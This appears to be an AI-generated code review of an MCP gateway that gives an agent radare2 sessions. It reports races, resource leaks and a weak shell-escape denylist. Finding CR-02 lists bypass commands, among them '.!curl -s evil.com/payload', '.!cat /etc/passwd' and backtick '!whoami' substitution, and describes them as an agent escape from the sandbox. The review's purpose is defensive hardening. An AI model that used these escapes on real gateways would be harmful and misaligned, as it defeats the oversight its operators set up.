---
phase: 08-session-scoped-r2
reviewed: 2026-05-18T00:00:00Z
depth: standard
files_reviewed: 12
files_reviewed_list:
  - mcp-gateway/src/mcp_gateway/app.py
  - mcp-gateway/src/mcp_gateway/artifacts_io.py
  - mcp-gateway/src/mcp_gateway/session_state.py
  - mcp-gateway/src/mcp_gateway/sessions.py
  - mcp-gateway/src/mcp_gateway/tools/__init__.py
  - mcp-gateway/src/mcp_gateway/tools/r2_sessions.py
  - mcp-gateway/tests/conftest.py
  - mcp-gateway/tests/test_artifacts_io.py
  - mcp-gateway/tests/test_r2_sessions.py
  - mcp-gateway/tests/test_resources_phase7.py
  - mcp-gateway/tests/test_sessions.py
  - mcp-gateway/tests/test_tool_list.py
findings:
  critical: 2
  warning: 7
  info: 5
  total: 14
status: issues_found
---

# Phase 8: Code Review Report

**Reviewed:** 2026-05-18
**Depth:** standard
**Files Reviewed:** 12
**Status:** issues_found

## Summary

Phase 8 introduces session-scoped r2 (radare2) subprocesses behind four new MCP
tools (`open_r2_session`, `r2_cmd`, `close_r2_session`, `list_sessions`) plus a
`SessionRegistry` primitive owned by the gateway lifespan. The implementation
is well-structured: lifespan unwind ordering (registry → backend) is correct,
process-group teardown via `os.killpg(pgid, SIGKILL)` is consistent across
`close`, reaper, and lifespan shutdown, the per-session randomized sentinel
defeats the "output contains my literal end-marker" trap, and the SESS-05
disclaimer is spliced into all four tool docstrings as the contract requires
(verified by `test_sess05_disclaimer_in_docstrings`).

The contract surface (D-23, D-11 18-key result dict, transcript schema, env-var
validation, lazy `r2-sessions/` subdir) is faithfully realised and well-tested.

However, two correctness defects are serious enough to call out as critical:

- **CR-01**: The `MAX_SESSIONS` cap is **not enforced under concurrent
  `open()` calls** — a classic TOCTOU between the cap-check (inside the
  registry lock) and the eventual session insertion (also inside the lock, but
  much later, after the entire spawn+lockdown+init phase that runs OUTSIDE the
  lock). N concurrent opens with the cap at 8 can spawn 8 + N − 1 r2
  processes.
- **CR-02**: The dangerous-command denylist regex misses real r2 shell-escape
  vectors: backtick command substitution `` `…` ``, the dot-prefixed
  `.!cmd` form (interpret-shell-output-as-r2-script), and any compound where
  `!` is preceded by something other than `;`/`|`/`\n`. The blocklist is
  documented as "shell-escape prefix `!` / `#!` / `R!`" and the tests assert
  exactly those, but r2's own command surface is wider.

Both findings have concrete fixes below. The warnings document race conditions
around the per-session lock vs. the reaper, partial-spawn cleanup gaps,
unhandled `IncompleteReadError` on r2 crash, and a few smaller correctness
issues. Info items are minor cleanups.

## Critical Issues

### CR-01: `MAX_SESSIONS` cap bypassable under concurrent `open()` calls (TOCTOU)

**File:** `mcp-gateway/src/mcp_gateway/sessions.py:264-355`
**Issue:**
`SessionRegistry.open()` checks the session-count cap inside `self._lock`
(line 265-268), generates the `session_id` while still holding the lock, then
**releases the lock** before doing the expensive r2 spawn + lockdown init +
user `init_commands` work. The session is only re-inserted into
`self._sessions` under the lock at the very end (line 354-355).

```python
async with self._lock:
    if self.count_open() >= self._max:
        raise SessionCapReached(...)
    session_id = secrets.token_urlsafe(12)
# ...lock released here...
# big chunk of work spawning r2, running lockdown, running init_commands
# ...
async with self._lock:
    self._sessions[session_id] = sess     # only NOW is the slot consumed
```

With the cap at the default value of 8, N concurrent callers all observe
`count_open() == 0` (or any value `< 8`) under the lock, all pass the cap
check, and all proceed to spawn their own r2 process. The cap is effectively
unenforced under any concurrency. In the worst case this allows an attacker
holding the bearer token to spin up an unbounded number of r2 subprocesses,
exhausting container RAM/PIDs.

The unit test `test_cap_reject` only exercises the **serial** N+1 case
(open, await, open, await, …) — which is why this slipped through.

**Fix:**
Reserve a slot under the lock by inserting a placeholder before releasing,
and replace the placeholder once the real `R2Session` is ready (or remove it
on failure). Example:

```python
# Inside SessionRegistry.open(), under self._lock:
async with self._lock:
    if self.count_open() >= self._max:
        raise SessionCapReached(self._max, self.count_open(), self.list())
    session_id = secrets.token_urlsafe(12)
    # Insert a placeholder so count_open() now includes this pending slot.
    # Placeholder is a sentinel marked closed=False but with proc=None.
    self._sessions[session_id] = _PendingSlot(session_id=session_id)

try:
    # ... existing spawn / lockdown / init_commands code ...
    sess = R2Session(session_id=session_id, ...)
    async with self._lock:
        self._sessions[session_id] = sess
except BaseException:
    # Remove the placeholder on any failure (incl. CancelledError).
    async with self._lock:
        self._sessions.pop(session_id, None)
    raise
```

Then `count_open()` must treat the placeholder as "occupied" (e.g., return
`len(self._sessions)` excluding fully-closed `R2Session` entries). The
`list()` helper must skip placeholders so they don't show up in the
`cap-reject` `existing` payload.

Add a regression test with `asyncio.gather(*[reg.open(...) for _ in range(N+1)])`
where exactly one call must raise `SessionCapReached`.

---

### CR-02: Dangerous-command regex misses backtick substitution and dot-shell-eval

**File:** `mcp-gateway/src/mcp_gateway/sessions.py:83-99`
**Issue:**
The denylist regex is:

```python
_DANGEROUS_R2_CMD_RE = re.compile(r"(?:^|;|\||\n)\s*(?:#!|R!|!)")
```

This only catches `!`, `#!`, or `R!` when preceded by start-of-string, `;`,
`|`, or `\n`. r2's actual command grammar has more ways to invoke a shell or
interpret untrusted output as r2 commands:

1. **Backtick substitution** — r2 evaluates `` `inner` `` and substitutes
   the output into the outer command. The inner command can be a shell
   escape:
   ```
   pdf @ `!whoami`             # backtick substitution; payload runs in shell
   wx `!cat /etc/passwd | xxd`
   ```
   Neither matches the current regex (the `!` is preceded by `` ` ``, not
   by `;|\n`).

2. **Dot-shell-eval** — `.!cmd` runs shell command `cmd`, then **interprets
   each output line as an r2 command**. The `!` here is preceded by `.`,
   which is none of the allowed separators:
   ```
   .!echo wx 90909090           # writes bytes to current seek
   .!curl -s evil.com/payload   # runs arbitrary shell, then r2-evals output
   ```
   This is arguably *more* dangerous than a bare `!` because it lets the
   attacker pivot from shell→r2 command surface (e.g., file writes via `wt`).

3. **`#!pipe` and similar variants** — r2 supports `#!pipe <lang> <script>`
   in some build configurations. The current regex catches `#!` at the
   anchored positions but not when nested inside backticks or after `.`.

4. **Negative-test backstops not exhaustive** — the negative matrix
   (`pi 10`, `?V`, `pdf @ sym.foo`, `aaa ; afl`, `aflj`) does not include
   any of the bypass forms above, so the test suite gives false confidence.

**Fix:**

Tighten the regex (and the matching `test_dangerous_regex_matches_matrix`):

```python
# Updated regex: catch !, #!, R!, .!, and backtick substitution.
# Separators expanded to include backtick and the `.` r2-eval prefix.
_DANGEROUS_R2_CMD_RE = re.compile(
    r"(?:^|[;|\n`])\s*(?:#!|R!|!|\.!)"
    r"|`[^`]*[!]"               # backtick containing a !
)
```

Better: switch from a regex denylist to **structural parsing** of the r2
command. Tokenise on `;`, `|`, `` ` ``, then for each leaf token check
whether its first non-whitespace character is in the forbidden set
`{'!', '#', 'R!', '.!'}`. Regex denylists for command-injection prevention
are fragile by nature; a token walk is harder to bypass.

Add positive-matrix entries to `test_dangerous_regex_matches_matrix`:

```python
positive_extras = [
    "pdf @ `!whoami`",
    ".!ls",
    ".!cat /etc/passwd",
    "wx `!echo cafef00d`",
]
for bad in positive_extras:
    assert rx.search(bad) is not None, f"bypass: {bad!r}"
```

This is a **security-critical denylist** — under-coverage here is an agent
escape from the gateway sandbox.

## Warnings

### WR-01: Reaper can kill a session between `registry.get()` and `sess.lock` acquisition

**File:** `mcp-gateway/src/mcp_gateway/tools/r2_sessions.py:247-264`
**Issue:**
In `r2_cmd`:

```python
sess = registry.get(session_id)        # succeeds, returns live R2Session
check_dangerous_cmd(cmd)
# ... time passes; reaper may fire here ...
async with sess.lock:
    raw_bytes, timed_out = await sess.exec_one(sent_cmd, timeout=resolved_timeout)
```

The reaper closes idle sessions by calling `registry.close()` which holds
`self._lock` (registry lock) — NOT `sess.lock` (per-session lock). So
between `registry.get(...)` returning a valid `R2Session` and the line that
takes `sess.lock`, the reaper can run, mark the session `closed=True`,
`killpg(sess.pgid, SIGKILL)` the r2 process, and `sess.proc` becomes a dead
process. Then `exec_one` writes to a closed pipe → `BrokenPipeError`
escapes as an unhandled exception, bypassing the carefully-designed
"session_invalidated=True + exit_code=-9" return contract.

The race window is small in practice (the reaper polls every 60s by default
and only targets idle>1800s sessions), but the failure mode is incorrect
error reporting.

**Fix:**
Re-check `sess.closed` after acquiring `sess.lock`, and return the
"session_invalidated=True" envelope without attempting the write:

```python
async with sess.lock:
    if sess.closed:
        return _invalidated_envelope(sess, cmd, format, reason=sess.close_reason)
    raw_bytes, timed_out = await sess.exec_one(sent_cmd, timeout=resolved_timeout)
```

Additionally wrap `exec_one`'s stdin writes in a `try/except (BrokenPipeError,
ConnectionResetError)` and convert those to the timed-out=True path, since r2
can crash mid-command for other reasons (e.g., OOM, SIGSEGV in a plugin).

---

### WR-02: `exec_one` does not handle `IncompleteReadError` (r2 crash mid-command)

**File:** `mcp-gateway/src/mcp_gateway/sessions.py:149-171`
**Issue:**
`asyncio.StreamReader.readuntil(b"\n")` raises **`asyncio.IncompleteReadError`**
when the stream is closed before the separator is seen. If r2 dies between
the stdin write and the sentinel-line readout (e.g., segfault on a malformed
binary), this propagates as an uncaught exception out of `exec_one`. The
try/except only catches `asyncio.TimeoutError`.

```python
try:
    while True:
        line = await asyncio.wait_for(
            self.proc.stdout.readuntil(b"\n"),     # raises IncompleteReadError
            timeout=timeout,
        )
        ...
except asyncio.TimeoutError:
    return bytes(buf), True
# IncompleteReadError -> escapes here
```

The caller (`r2_cmd`) sees a raw `IncompleteReadError`, which surfaces as a
500-style MCP tool error instead of the orderly `session_invalidated=True`
contract.

**Fix:**

```python
except asyncio.TimeoutError:
    return bytes(buf), True
except asyncio.IncompleteReadError as e:
    # r2 died mid-command; partial bytes are in e.partial.
    buf.extend(e.partial)
    return bytes(buf), True   # treat as timeout-equivalent (whole-session-kill)
```

The caller already does `await registry.close(session_id, reason="timeout")`
on `timed_out=True`, which is the correct posture for a dead-r2 process too.

---

### WR-03: `os.getpgid(proc.pid)` is racy and unnecessary

**File:** `mcp-gateway/src/mcp_gateway/sessions.py:286`
**Issue:**

```python
proc = await asyncio.create_subprocess_exec(..., start_new_session=True)
pgid = os.getpgid(proc.pid)
```

Two problems:

1. **Race**: If r2 exits between line 278 (`create_subprocess_exec`) and
   line 286 (`os.getpgid`), `getpgid` raises `ProcessLookupError` —
   uncaught. The half-spawned `proc` is leaked (no `proc.wait()` is
   awaited).
2. **Unnecessary**: `start_new_session=True` causes the child to call
   `setsid()`, which always makes the child both the session leader AND
   the process-group leader of a new process group whose PGID equals its
   PID. Therefore `pgid == proc.pid` by construction; the `getpgid` call
   is redundant.

**Fix:**

```python
# start_new_session=True => pgid == pid (Linux setsid contract)
pgid = proc.pid
```

This eliminates the race and removes one stat syscall per session open.
For extra safety, wrap the post-spawn block in `try/except BaseException`
that calls `os.killpg(proc.pid, SIGKILL)` + `await proc.wait()` on failure
(see WR-04 for the broader cleanup gap).

---

### WR-04: Partial-spawn cleanup gap — pgid leak on early exception

**File:** `mcp-gateway/src/mcp_gateway/sessions.py:278-311`
**Issue:**
The cleanup path on lockdown-init failure only fires if the failure happens
inside the explicit `try` block (line 296-302). The lines BEFORE the try —
`ensure_subdir`, `confine_to`, the sentinel generation, the
`create_subprocess_exec` call itself, and `os.getpgid` — can all raise, and
none of them clean up the spawned `proc` if it exists.

Specifically, if `os.getpgid` (WR-03) raises after the spawn succeeded, or
if any disk operation between spawn and the init try-block raises, the r2
process is leaked.

Also: `except (asyncio.TimeoutError, Exception):` (line 303) is redundant —
`Exception` already includes `TimeoutError`. Cosmetic but suggests
copy-paste rather than intentional design.

**Fix:**
Structure the entire post-spawn block as a single try/except that always
cleans up on failure:

```python
proc = await asyncio.create_subprocess_exec(...)
try:
    pgid = proc.pid  # WR-03
    # everything else: ensure_subdir, confine_to, init batch, user init_commands
    ...
except BaseException:
    try:
        os.killpg(proc.pid, signal.SIGKILL)
    except (ProcessLookupError, PermissionError):
        pass
    with contextlib.suppress(Exception):
        await asyncio.shield(proc.wait())
    raise
```

Use `BaseException` (not `Exception`) so cancellation also triggers
cleanup. Replace the existing duplicate-exception clause with a single
`except BaseException:` block.

---

### WR-05: `relative_to(case_dir)` can raise if `case_dir` is not canonical

**File:** `mcp-gateway/src/mcp_gateway/tools/r2_sessions.py:191, 309, 318, 381` and `sessions.py:372, 409`
**Issue:**
`transcript_path` is built via `confine_to(case_dir, f"r2-sessions/{...}")`,
which returns the **resolved** path (symlinks followed, `.resolve()` applied).
`sess.case_dir` is stored as `Path(resolve_case_dir(case_dir))` —
**not resolved**. If `resolve_case_dir` returns a path containing a symlink
component, `transcript_path.relative_to(sess.case_dir)` raises
`ValueError: '/realpath/.../t.log' is not in the subpath of '/symlink/...'`.

This affects:
- `open_r2_session` return dict (`transcript_path` field)
- `r2_cmd` per-call return dict (`transcript_path`, `log_path`)
- `close_r2_session` / `registry.close` (lines 372, 409)
- `list_sessions` (`transcript_path` field)

Failure mode: 500-style tool error on every r2_cmd call, even for benign
commands, when STATUS_ROOT contains a symlink (production deployments often
do — `/agent/status` symlinking into a volume mount).

**Fix:**
Resolve `case_dir` once at session-open time and store the canonical form:

```python
# In SessionRegistry.open(), after the spawn-success guard:
sess = R2Session(
    ...
    case_dir=case_dir.resolve(strict=True),
    ...
)
```

Or, defensively, in each `.relative_to(...)` call site, use
`pathlib.PurePath.relative_to` on resolved-vs-resolved (call `.resolve()`
on both sides). The first approach is cleaner.

---

### WR-06: `sample_path.read_bytes()` loads entire sample into memory

**File:** `mcp-gateway/src/mcp_gateway/tools/r2_sessions.py:164`
**Issue:**

```python
sample_sha = hashlib.sha256(sample_path.read_bytes()).hexdigest()
```

For multi-GB malware samples (memory dumps, large packed binaries, disk
images dropped into a case), this loads the entire file into RAM in one
shot. Inside the container this can easily OOM-kill the gateway process.

**Fix:**
Stream the digest:

```python
h = hashlib.sha256()
with open(sample_path, "rb") as f:
    for chunk in iter(lambda: f.read(1 << 20), b""):  # 1 MiB chunks
        h.update(chunk)
sample_sha = h.hexdigest()
```

Or factor this into a shared helper since the same pattern likely exists
elsewhere in Phase 7's sample-resolver code.

---

### WR-07: `os.killpg` may race a reused PGID after r2 exits

**File:** `mcp-gateway/src/mcp_gateway/sessions.py:305, 343, 385`
**Issue:**
On Linux, PIDs (and therefore PGIDs created by `setsid`) are recycled.
If r2 exits naturally between the close decision and the `os.killpg(pgid,
SIGKILL)` call, the kernel may have already reaped the process group and
allocated the same PGID to a new, unrelated process. We then SIGKILL that
unrelated process group.

Window: tiny under normal load, but the kernel's PID-recycling pressure
is much higher inside the agent container where many short-lived shell
runs spawn from Phase 7's `run_shell` etc. This is a known POSIX hazard.

**Fix:**
Check `proc.returncode is None` before calling `killpg`:

```python
if sess.proc.returncode is None:
    try:
        os.killpg(sess.pgid, signal.SIGKILL)
    except (ProcessLookupError, PermissionError):
        pass
await asyncio.shield(sess.proc.wait())
```

Better: keep a reference to the `asyncio.subprocess.Process` and use
`proc.kill()` first (which targets the specific PID via the kernel's
pid-file-descriptor when available on newer Pythons), then `killpg` only
if `proc.kill()` is insufficient.

Apply the same fix in three places: `open()` failure cleanup (line 305,
line 343) and `close()` (line 385).

## Info

### IN-01: Init-command outputs not written to transcript

**File:** `mcp-gateway/src/mcp_gateway/sessions.py:338-351`
**Issue:**
The opening header `=== MARE r2_session ... opened ... ===` is written at
line 315-319, BEFORE the user `init_commands` run (lines 338-351). The
user's init commands execute via `sess.exec_one` but their outputs are
discarded — only `command_count` and `last_used_at` are updated, no
transcript line is emitted.

This is a forensic gap: an analyst replaying a transcript cannot see what
state the session was in after init. For example, `init_commands=['aaa']`
runs auto-analysis which produces meaningful output (function counts,
warnings), and that output is lost.

**Fix:**
Mirror the per-command transcript-line pattern from `_persist_artifacts`
for each init_command. Either inline a small writer inside `open()`, or
factor `_persist_artifacts` so it can be called from the registry layer.

### IN-02: Reaper loop sleeps before first iteration

**File:** `mcp-gateway/src/mcp_gateway/sessions.py:441-444`
**Issue:**

```python
while True:
    try:
        await asyncio.sleep(self._reaper_interval_s)   # sleeps first
        ...
```

If the registry is entered with already-idle sessions present (impossible
at lifespan boot, but possible if `SessionRegistry` were ever reused),
they will not be reaped for at least one interval. Cosmetic only.

**Fix:**
Move the sleep to the end of the loop, or use `asyncio.timeout` /
`asyncio.Event.wait(timeout=…)` for cleaner cancellation semantics.

### IN-03: Duplicate exception class in `except` tuple

**File:** `mcp-gateway/src/mcp_gateway/sessions.py:303`
**Issue:**

```python
except (asyncio.TimeoutError, Exception):
```

`asyncio.TimeoutError` is a subclass of `Exception`, so listing both is
redundant — the second one alone catches all of them. This pattern reads
like copy-paste from an older version that was more specific.

**Fix:**
Either narrow to only `(asyncio.TimeoutError,)` (and let other errors
propagate to a separate `except BaseException:` cleanup block — see
WR-04), or drop the duplicate:

```python
except Exception:
```

### IN-04: `_ends_in_j` may misclassify multi-word commands

**File:** `mcp-gateway/src/mcp_gateway/tools/r2_sessions.py:66-68`
**Issue:**

```python
def _ends_in_j(cmd: str) -> bool:
    return cmd.rstrip().endswith("j")
```

For an r2 command like `pdf @ sym.j_foo` (decompile at symbol whose name
happens to end in `j`), this returns True and the `j` JSON suffix is
NOT appended. Result: the user passed `format="json"` but the command
runs in text mode and `parsed_json` will be None. Edge case, but the
function name suggests "ends in r2-JSON-mode suffix" when it really
just means "last char is the letter j".

**Fix:**
Tokenize the command to find the actual r2 op (the first whitespace- or
`@`-delimited token) and check that token's last char:

```python
def _ends_in_j(cmd: str) -> bool:
    # Strip trailing whitespace, then strip any @addr / ~filter / | pipe suffix.
    head = cmd.rstrip().split(maxsplit=1)[0]
    return head.endswith("j")
```

Lower priority — the design intent is best-effort, and a `parse_error`
on a mis-suffixed JSON command is recoverable from the caller.

### IN-05: `truncate_for_response` UTF-8 walk-back has tiny edge case

**File:** `mcp-gateway/src/mcp_gateway/sessions.py:115-125`
**Issue:**

```python
while cut and (cut[-1] & 0xC0) == 0x80:
    cut = cut[:-1]
```

This walks back continuation bytes (`10xxxxxx`) but not the leading byte
of a multi-byte sequence. If the cut lands exactly on a leading byte
(e.g., `11110xxx` for a 4-byte code point), `errors="replace"` handles
it by inserting U+FFFD — fine, but the comment says "drops trailing bytes
if they would split a code point", which suggests intent to AVOID the
replacement char.

**Fix (optional):**

```python
while cut:
    b = cut[-1]
    if (b & 0xC0) == 0x80:        # continuation byte
        cut = cut[:-1]
    elif (b & 0x80) != 0:         # leading byte of multi-byte seq -> also drop
        cut = cut[:-1]
        break
    else:
        break                      # ASCII byte; safe boundary
return cut.decode("utf-8", errors="replace")
```

Truly cosmetic — `errors="replace"` makes the current code correct, just
slightly inconsistent with the docstring.

---

_Reviewed: 2026-05-18_
_Reviewer: Claude (gsd-code-reviewer)_
_Depth: standard_
